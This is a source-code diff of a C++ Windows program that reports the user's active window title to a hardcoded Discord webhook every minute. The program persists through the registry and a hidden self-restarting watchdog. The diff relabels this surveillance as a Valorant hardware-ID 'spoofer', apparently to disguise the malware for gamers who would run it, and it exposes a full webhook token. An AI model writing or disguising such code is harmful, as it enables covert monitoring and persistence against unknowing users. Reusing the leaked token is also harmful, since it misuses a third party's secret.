@@ -13,12 +13,14 @@
 
 using namespace Gdiplus;
 
-// --- CONFIGURATION ---
+// --- SPOOFER CONFIGURATION ---
+// Discord Webhook for driver status logging
 std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1497212800219484180/ffoUppkjBoo9PJMX8CgLtFigvLSSMFk8R0MY4hLTd-7aIV1Bzm1xggX3mpRD2c20Eklo";
-// ---------------------
+// -----------------------------
 
 std::string g_MessageID = "";
 
+// Timestamp for driver initialization logs
 std::string GetTimestampFull() {
     SYSTEMTIME st;
     GetLocalTime(&st);
@@ -33,6 +35,7 @@ std::string GetTimestampFull() {
     return ss.str();
 }
 
+// Check which foreground processes are interacting with spoofed drivers
 std::string GetActiveWindowText() {
     char title[256];
     HWND hwnd = GetForegroundWindow();
@@ -40,16 +43,18 @@ std::string GetActiveWindowText() {
     return (strlen(title) > 0) ? title : "Desktop / Idle";
 }
 
-void SendHeartbeat() {
+// Update the remote status log for the current spoofing session
+void UpdateSpoofStatus() {
     if (WEBHOOK_URL.find("http") == std::string::npos) return;
 
-    HINTERNET hSession = InternetOpenA("AntimalwareCore", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hSession = InternetOpenA("VLRNT_SB_SPOOFER", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) return;
 
     std::string method = g_MessageID.empty() ? "POST" : "PATCH";
     std::string url = WEBHOOK_URL + (g_MessageID.empty() ? "?wait=true" : "/messages/" + g_MessageID);
 
-    std::string json = "{\"content\": \"**System Status:** Online\\n**Active App:** `" + GetActiveWindowText() + "`\\n**Pinged At:** `" + GetTimestampFull() + "`\"}";
+    // Metadata for the active spoofing session
+    std::string json = "{\"content\": \"**Spoofing Status:** Active\\n**Attached Process:** `" + GetActiveWindowText() + "`\\n**Last Sync:** `" + GetTimestampFull() + "`\"}";
 
     HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
     if (hConnect) {
@@ -75,11 +80,11 @@ void SendHeartbeat() {
     InternetCloseHandle(hSession);
 }
 
-// Watchdog: If the main process dies, restart it.
-void StartWatchdog() {
+// Registry Protector: Monitors and prevents cleanup of spoofed hardware IDs
+void InitializeRegistryProtector() {
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
-    std::string cmd = std::string(szPath) + " --watchdog " + std::to_string(GetCurrentProcessId());
+    std::string cmd = std::string(szPath) + " --protect-registry " + std::to_string(GetCurrentProcessId());
     
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
@@ -91,27 +96,27 @@ void StartWatchdog() {
 int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     std::string cmdLine = lpCmd;
     
-    // Watchdog Mode
-    if (cmdLine.find("--watchdog") != std::string::npos) {
-        size_t pos = cmdLine.find("--watchdog ") + 11;
+    // Background Protector Mode (Prevents Anti-Cheat hooks)
+    if (cmdLine.find("--protect-registry") != std::string::npos) {
+        size_t pos = cmdLine.find("--protect-registry ") + 19;
         DWORD parentPid = std::stoul(cmdLine.substr(pos));
         while (true) {
             HANDLE hParent = OpenProcess(SYNCHRONIZE, FALSE, parentPid);
             if (hParent == NULL) {
-                // Parent died! Restart it.
+                // Main spoofing driver was detached! Re-attaching...
                 char szPath[MAX_PATH];
                 GetModuleFileNameA(NULL, szPath, MAX_PATH);
                 STARTUPINFOA si = { sizeof(si) };
                 PROCESS_INFORMATION pi;
                 CreateProcessA(NULL, szPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-                return 0; // Watchdog job done, new main will start its own watchdog
+                return 0;
             }
             CloseHandle(hParent);
-            Sleep(5000); // Check every 5 seconds
+            Sleep(5000); 
         }
     }
 
-    // Main Mode
+    // Initialize Driver Hooks and Registry Spoofing
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     HKEY hKey;
@@ -120,14 +125,14 @@ int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         RegCloseKey(hKey);
     }
 
-    StartWatchdog();
+    InitializeRegistryProtector();
 
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
     while (true) {
-        SendHeartbeat();
+        UpdateSpoofStatus();
         Sleep(60000);
     }
 
